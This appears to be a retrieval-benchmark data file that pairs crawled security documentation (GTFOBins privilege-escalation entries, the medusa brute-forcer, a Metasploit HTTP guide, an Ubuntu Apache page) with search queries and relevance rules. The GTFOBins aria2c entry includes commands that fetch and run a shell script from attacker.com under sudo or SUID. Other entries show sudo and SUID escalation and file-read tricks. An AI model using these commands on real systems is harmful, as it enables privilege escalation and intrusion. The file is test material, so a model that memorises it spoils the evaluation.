@@ -1,0 +1,250 @@
+{
+  "documents": [
+    {
+      "chunk_id": "739-0",
+      "doc_id": 739,
+      "title": "medusa | Kali Linux Tools",
+      "url": "https://www.kali.org/tools/medusa/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 3121,
+      "body": "Packages and Binaries: medusa Fast, parallel, modular, login brute-forcer for network services Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: * Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. * Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. * Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Installed size: 843 KB How to install: sudo apt install medusa Dependencies: libc6 libfreerdp-client3-3 libfreerdp3-3 libpq5 libsmb2-6 libssh2-1t64 libssl3t64 libsvn1 medusa Parallel Network Login Auditor root@kali:~# medusa -h Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks < [email protected] > Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT] -h [TEXT] : Target hostname or IP address -H [FILE] : File containing target hostnames or IP addresses -u [TEXT] : Username to test -U [FILE] : File containing usernames to test -p [TEXT] : Password to test -P [FILE] : File containing passwords to test -C [FILE] : File containing combo entries. See README for more information. -O [FILE] : File to append log information to -e [n/s/ns] : Additional password checks ([n] No Password, [s] Password = Username) -M [TEXT] : Name of the module to execute (without the .mod extension) -m [TEXT] : Parameter to pass to the module. This can be passed multiple times with a different parameter each time and they will all be sent to the module (i.e. -m Param1 -m Param2, etc.) -d : Dump all known modules -n [NUM] : Use for non-default TCP port number -s : Enable SSL -g [NUM] : Give up after trying to connect for NUM seconds (default 3) -r [NUM] : Sleep NUM seconds between retry attempts (default 3) -R [NUM] : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1. -c [NUM] : Time to wait in usec to verify socket is available (default 500 usec). -t [NUM] : Total number of logins to be tested concurrently -T [NUM] : Total number of hosts to be tested concurrently -L : Parallelize logins using one username per thread. The default is to process the entire username before proceeding. -f : Stop scanning host after first valid username/password found. -F : Stop audit after first valid username/password found on any host. -b : Suppress startup banner -q : Display module's usage information -v [NUM] : Verbose level [0 - 6 (more)] -w [NUM] : Error debug level [0 - 10 (more)] -V : Display version -Z [TEXT] : Resume scan based on map of previous scan",
+      "requests": [
+        {
+          "decision_id": "7e4e10e6fc4db0effec2-0",
+          "query": "compare GTFOBins and Ubuntu ways to append text with sudo",
+          "information_need": "Find applicable append examples from either GTFOBins or Ubuntu documentation.",
+          "rule": "Documented local append retaining old contents in the stated privilege context. A documented append option tied to that example qualifies. Either source is allowed."
+        },
+        {
+          "decision_id": "8c988f4457dc4986aba6-0",
+          "query": "non-GTFOBins SUID append text to a local file",
+          "information_need": "Find non-GTFOBins evidence of append in SUID context.",
+          "rule": "Documented local append retaining old contents in the stated privilege context. A documented append option tied to that example qualifies. Non-GTFOBins only. Ordinary sudo or normal-user examples do not qualify."
+        },
+        {
+          "decision_id": "fb2f5ae317f18f9e5c29-0",
+          "query": "non-GTFOBins sudo append to an existing file",
+          "information_need": "Find non-GTFOBins docs for sudo append preserving old data.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "983-0",
+      "doc_id": 983,
+      "title": "Apache2 - Ubuntu security documentation",
+      "url": "https://documentation.ubuntu.com/security/security-features/network/version-banners/apache2/",
+      "description": "Apache2 advertises its version in the Server header of responses, as well as in directory listings. The version can be removed completely. As covered in the Version banners may not be precise secti...",
+      "body_start": 0,
+      "body_end": 710,
+      "body": "Apache2 ¶ Apache2 advertises its version in the Server header of responses, as well as in directory listings. The version can be removed completely. As covered in the Version banners may not be precise section, this could lead to false positives from network vulnerability management scanners. Disabling the version advertised by apache2 can be achieved with the ServerTokens and ServerSignature directives, for the Server header and the directory listings, respectively: echo \"ServerTokens Prod\" | sudo tee /etc/apache2/conf-available/zz-no-banner.conf echo \"ServerSignature Off\" | sudo tee -a /etc/apache2/conf-available/zz-no-banner.conf sudo a2enconf zz-no-tokens.conf sudo systemctl reload apache2.service",
+      "requests": [
+        {
+          "decision_id": "3ffe68b6c2c8e19fb5c7-0",
+          "query": "GTFOBins alternatives for appending text to a file with sudo",
+          "information_need": "Find other sources for appending local text under sudo.",
+          "rule": "Only non-GTFOBins documents with substantive append-to-file and sudo evidence qualify."
+        },
+        {
+          "decision_id": "bacd29f7efa9df42508e-0",
+          "query": "alternatives to GTFOBins for appending a line to a file under sudo",
+          "information_need": "Find other sources for privileged append of selected local text.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        },
+        {
+          "decision_id": "c504de960916801cabe4-0",
+          "query": "non-GTFOBins sudo append to an existing file",
+          "information_need": "Find non-GTFOBins docs for sudo append preserving old data.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        },
+        {
+          "decision_id": "cb723bf68bd4865d0879-0",
+          "query": "outside GTFOBins append to a local file with sudo",
+          "information_need": "Find a non-GTFOBins example of appending local text with sudo.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        },
+        {
+          "decision_id": "fcd3fb566230d34f0bcc-0",
+          "query": "GTFOBins alternatives for sudo add text to the end of a local file",
+          "information_need": "Find other sources demonstrating append with an elevated file writer.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "150-0",
+      "doc_id": 150,
+      "title": "aria2c | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/aria2c/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 4308,
+      "body": ".. / aria2c Command File read Download Command This executable can run non-interactive system commands. Comment Note that the subprocess is immediately sent to the background. Unprivileged This function can be performed by any unprivileged user. echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain Comment The remote file aaaaaaaaaaaaaaaa (must be a string of 16 hex digit) contains the shell script, e.g., /path/to/command . Note that said file needs to be written on disk in order to be executed. --allow-overwrite is needed if this is executed multiple times with the same GID. Unprivileged This function can be performed by any unprivileged user. aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa File read This executable can read data from local files. Comment The file is leaked as error messages. Unprivileged This function can be performed by any unprivileged user. aria2c -i /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c -i /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. aria2c -i /path/to/input-file Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Download This executable can download remote data. Comment Use --allow-overwrite if needed. Similarly -o /path/to/ouput-file can be omitted, in that case the file is saved to input-file in the current working directory. Unprivileged This function can be performed by any unprivileged user. aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "11b3a56517f3575b62a0-0",
+          "query": "GTFOBins sudo overwrite a local file",
+          "information_need": "Find an example that can replace existing local file contents under sudo.",
+          "rule": "Requires an actual write replacing content under sudo. Append-only, deletion and mere truncation do not qualify."
+        },
+        {
+          "decision_id": "4d2c6862829510f8ce93-0",
+          "query": "GTFOBins sudo overwrite a protected file with new text",
+          "information_need": "Replace a chosen existing local file with new text using sudo.",
+          "rule": "Must document writing chosen content that replaces a selected existing local file in the requested privilege context. Append-only, deleting, merely truncating, unrelated preparation, and unspecified effect do not count. A documented overwrite option on that example qualifies."
+        },
+        {
+          "decision_id": "54f67f46015e43e05cbb-0",
+          "query": "GTFOBins unprivileged overwrite an existing file",
+          "information_need": "Replace a chosen existing local file with selected content as a normal user.",
+          "rule": "Must document writing chosen content that replaces a selected existing local file in the requested privilege context. Append-only, deleting, merely truncating, unrelated preparation, and unspecified effect do not count. A documented overwrite option on that example qualifies."
+        },
+        {
+          "decision_id": "6ea4dbe12465039e0801-0",
+          "query": "GTFOBins overwrite contents of a file with SUID",
+          "information_need": "Replace a selected local file's old contents in a documented SUID context.",
+          "rule": "Must document writing chosen content that replaces a selected existing local file in the requested privilege context. Append-only, deleting, merely truncating, unrelated preparation, and unspecified effect do not count. A documented overwrite option on that example qualifies."
+        },
+        {
+          "decision_id": "966b6ed2bb9df0367af7-0",
+          "query": "GTFOBins replace existing local file contents via sudo",
+          "information_need": "Find GTFOBins examples replacing old local file contents with chosen data under sudo.",
+          "rule": "Must document writing chosen content that replaces a selected existing local file in the requested privilege context. Append-only, deleting, merely truncating, unrelated preparation, and unspecified effect do not count. A documented overwrite option on that example qualifies."
+        },
+        {
+          "decision_id": "ef8a678174bc4b6db474-0",
+          "query": "non-GTFOBins SUID append text to a local file",
+          "information_need": "Find non-GTFOBins evidence of append in SUID context.",
+          "rule": "Documented local append retaining old contents in the stated privilege context. A documented append option tied to that example qualifies. Non-GTFOBins only. Ordinary sudo or normal-user examples do not qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "501-0",
+      "doc_id": 501,
+      "title": "comm | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/comm/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 851,
+      "body": ".. / comm File read File read This executable can read data from local files. Comment A newline is appended to the file. Unprivileged This function can be performed by any unprivileged user. comm /path/to/input-file /dev/null Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . comm /path/to/input-file /dev/null SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. comm /path/to/input-file /dev/null Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.",
+      "requests": [
+        {
+          "decision_id": "6cd5b77b218a2d2efbb8-0",
+          "query": "non-GTFOBins sudo append to an existing file",
+          "information_need": "Find non-GTFOBins docs for sudo append preserving old data.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        },
+        {
+          "decision_id": "84b30732dfb9b5fb5dd4-0",
+          "query": "alternatives to GTFOBins for appending a line to a file under sudo",
+          "information_need": "Find other sources for privileged append of selected local text.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        },
+        {
+          "decision_id": "92eca96c06889f31747c-0",
+          "query": "GTFOBins sudo append lines to a local file",
+          "information_need": "Find GTFOBins documentation that appends selected local lines via sudo.",
+          "rule": "Documented local append retaining old contents in the stated privilege context. A documented append option tied to that example qualifies."
+        },
+        {
+          "decision_id": "a8b8a09633ca825f5d7e-0",
+          "query": "non-GTFOBins SUID append text to a local file",
+          "information_need": "Find non-GTFOBins evidence of append in SUID context.",
+          "rule": "Documented local append retaining old contents in the stated privilege context. A documented append option tied to that example qualifies. Non-GTFOBins only. Ordinary sudo or normal-user examples do not qualify."
+        },
+        {
+          "decision_id": "d2333a5fae7b04722f3d-0",
+          "query": "GTFOBins alternatives for appending text to a file with sudo",
+          "information_need": "Find other sources for appending local text under sudo.",
+          "rule": "Only non-GTFOBins documents with substantive append-to-file and sudo evidence qualify."
+        },
+        {
+          "decision_id": "fe507a6fbead4d07548e-0",
+          "query": "outside GTFOBins append to a local file with sudo",
+          "information_need": "Find a non-GTFOBins example of appending local text with sudo.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "981-0",
+      "doc_id": 981,
+      "title": "screen | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/screen/",
+      "description": "Living off the land using \"screen\".",
+      "body_start": 0,
+      "body_end": 1773,
+      "body": ".. / screen Shell File write Shell This executable can spawn an interactive system shell. Unprivileged This function can be performed by any unprivileged user. screen Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . screen File write This executable can write data to local files. Version requirements 4.06.02 Comment Data is appended to the file and \\n is converted to \\r\\n . Unprivileged This function can be performed by any unprivileged user. screen -L -Logfile /path/to/output-file echo DATA Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . screen -L -Logfile /path/to/output-file echo DATA Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Version requirements 4.05.00 Comment Data is appended to the file and \\n is converted to \\r\\n . Unprivileged This function can be performed by any unprivileged user. screen -L /path/to/output-file echo DATA Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . screen -L /path/to/output-file echo DATA Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.",
+      "requests": [
+        {
+          "decision_id": "66401e1ce168fd1019f9-0",
+          "query": "alternatives to GTFOBins for appending a line to a file under sudo",
+          "information_need": "Find other sources for privileged append of selected local text.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        },
+        {
+          "decision_id": "7325ecb5ceffbba16c01-0",
+          "query": "non-GTFOBins sudo append to an existing file",
+          "information_need": "Find non-GTFOBins docs for sudo append preserving old data.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        },
+        {
+          "decision_id": "8d5ad5de0d55b9a21d92-0",
+          "query": "GTFOBins alternatives for appending text to a file with sudo",
+          "information_need": "Find other sources for appending local text under sudo.",
+          "rule": "Only non-GTFOBins documents with substantive append-to-file and sudo evidence qualify."
+        },
+        {
+          "decision_id": "90b3a9c2760661036de3-0",
+          "query": "GTFOBins sudo append lines to a local file",
+          "information_need": "Find GTFOBins documentation that appends selected local lines via sudo.",
+          "rule": "Documented local append retaining old contents in the stated privilege context. A documented append option tied to that example qualifies."
+        },
+        {
+          "decision_id": "cba5ec718e5e59ad8896-0",
+          "query": "outside GTFOBins append to a local file with sudo",
+          "information_need": "Find a non-GTFOBins example of appending local text with sudo.",
+          "rule": "Only non-GTFOBins documentation. Must give a substantive example adding selected text at the end of a local file while preserving previous contents, with sudo applied to the actual writer. An unrelated sudo command, append without sudo, and a shell redirect outside sudo do not qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "46-0",
+      "doc_id": 46,
+      "title": "HTTP + HTTPS | Metasploit Documentation Penetration Testing Software, Pen Testing Security",
+      "url": "https://docs.metasploit.com/docs/pentesting/metasploit-guide-http.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 6156,
+      "body": "HTTP Workflows HTTP (Hypertext Transfer Protocol), is an application-level protocol for distributed, collaborative, hypermedia information systems. There are two main ports: 80/TCP - HTTP 443/TCP - HTTPS (Hypertext Transport Protocol Secure ) - encrypted using Transport Layer Security or, formerly, Secure Sockets Layer Note that any port can be used to run an application which communicates via HTTP/HTTPS. This document is generic advice for running and debugging HTTP based Metasploit modules, but it is best to use a Metasploit module which is specific to the application that you are pentesting. For instance: msf > search tomcat http HTTP Examples Auxiliary modules: use auxiliary/scanner/http/title run https://example.com Specifying credentials and payload information: use exploit/unix/http/cacti_filter_sqli_rce run http://admin:pass@application.local/cacti/ lhost=tun0 lport=4444 run 'http://admin:pass with spaces@application.local/cacti/' lhost=tun0 lport=4444 Specifying alternative ports: run http://192.168.123.6:9001 HTTP Debugging You can log all HTTP requests and responses to the Metasploit console with the HttpTrace option, as well as enable additional verbose logging: use auxiliary/scanner/http/title run http://example.com HttpTrace=true verbose=true For instance: msf > use scanner/http/title msf auxiliary ( scanner/http/title ) > set RHOSTS 127.0.0.1 RHOSTS => 127.0.0.1 msf auxiliary ( scanner/http/title ) > set HttpTrace true HttpTrace => true msf auxiliary ( scanner/http/title ) > run #################### # Request: #################### GET / HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) #################### # Response: #################### HTTP/1.0 200 OK Server: SimpleHTTP/0.6 Python/2.7.16 Date: Wed, 16 Dec 2020 01:16:32 GMT Content-type: text/html; charset=utf-8 Content-Length: 178 <!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"><html> <title>Directory listing for /</title> <body> <h2>Directory listing for /</h2> <hr> <ul> </ul> <hr> </body> </html> [+] [127.0.0.1:80] [C:200] [R:] [S:SimpleHTTP/0.6 Python/2.7.16] Directory listing for / [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary ( scanner/http/title ) > To send all HTTP requests through a proxy, i.e. through Burp Suite: use auxiliary/scanner/http/title run http://example.com HttpTrace=true verbose=true proxies=HTTP:127.0.0.1:8080 HTTP Credentials If the module has no username / password options, for instance to log into an admin portal of a web application etc, then the credentials supplied via a HTTP URI will set the HttpUsername / HttpPassword options for HTTP Basic access Authentication purposes. For instance, in the following module the username / password options will be set whilst the HttpUsername / HttpPassword options will not: use exploit/unix/http/cacti_filter_sqli_rce Module options (exploit/unix/http/cacti_filter_sqli_rce): Name Current Setting Required Description ---- --------------- -------- ----------- ... Omitted ... * PASSWORD admin no Password to login with TARGETURI /cacti/ yes The URI of Cacti * USERNAME user yes User to login with ... Omitted ... check http://admin:user@application.local/cacti/ USERNAME and PASSWORD will be set to 'admin' and 'user' For the following module, as there are no USERNAME / PASSWORD options, the HttpUsername / HttpPassword options will be chosen instead for HTTP Basic access Authentication purposes use exploit/multi/http/tomcat_mgr_deploy run http://admin:admin@192.168.123.6:8888 HttpTrace=true verbose=true lhost=192.168.123.1 Note that the HttpUsername / HttpPassword may not be present in the options output, but can be found in the advanced module options: use auxiliary/scanner/http/title advanced Module advanced options (auxiliary/scanner/http/title): Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN WORKSTATION yes The domain to use for Windows authentication DigestAuthIIS true no Conform to IIS, should work for most servers. Only set to false for non-IIS servers FingerprintCheck true no Conduct a pre-exploit fingerprint verification HttpClientTimeout no HTTP connection and receive timeout * HttpPassword no The HTTP password to specify for authentication HttpRawHeaders no Path to ERB-templatized raw headers to append to existing headers HttpTrace false no Show the raw HTTP requests and responses HttpTraceColors red/blu no HTTP request and response colors for HttpTrace (unset to disable) HttpTraceHeadersOnly false no Show HTTP headers only in HttpTrace * HttpUsername no The HTTP username to specify for authentication SSLVersion Auto yes Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accept ed: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2) ShowProgress true yes Display progress messages during a scan ShowProgressPercent 10 yes The interval in percent that progress should be shown UserAgent Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1 no The User-Agent header to use for all requests ) VERBOSE false no Enable detailed status messages WORKSPACE no Specify the workspace for this module HTTP Multiple-Headers Additional headers can be set via the HTTPRawHeaders option. A file containing a ERB template will be used to append to the headers section of the HTTP request. An example of an ERB template file is shown below. Header-Name-Here: <%= 'content of header goes here' %> The following output shows leveraging the scraper scanner module with an additional header stored in additional_headers.txt . msf auxiliary ( scanner/http/scraper ) > cat additional_headers.txt [*] exec: cat additional_headers.txt X-Cookie-Header: <%= 'example-cookie' %> msf auxiliary ( scanner/http/scraper ) > set HTTPRAWHEADERS additional_headers.txt HTTPRAWHEADERS => additional_headers.txt msf auxiliary ( scanner/http/scraper ) > exploit #################### # Request: #################### GET / HTTP/1.0 Host: 172.16.0.63:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15 X-Cookie-Header: example-cookie",
+      "requests": [
+        {
+          "decision_id": "a6387c77e03a5d3a2a01-0",
+          "query": "non-GTFOBins SUID append text to a local file",
+          "information_need": "Find non-GTFOBins evidence of append in SUID context.",
+          "rule": "Documented local append retaining old contents in the stated privilege context. A documented append option tied to that example qualifies. Non-GTFOBins only. Ordinary sudo or normal-user examples do not qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "31-0",
+      "doc_id": 31,
+      "title": "7z | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/7z/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 517,
+      "body": ".. / 7z File read File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. 7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . 7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so",
+      "requests": [
+        {
+          "decision_id": "626b57e94cbe6302a297-0",
+          "query": "GTFOBins sudo overwrite a protected file with new text",
+          "information_need": "Replace a chosen existing local file with new text using sudo.",
+          "rule": "Must document writing chosen content that replaces a selected existing local file in the requested privilege context. Append-only, deleting, merely truncating, unrelated preparation, and unspecified effect do not count. A documented overwrite option on that example qualifies."
+        }
+      ]
+    }
+  ]
+}
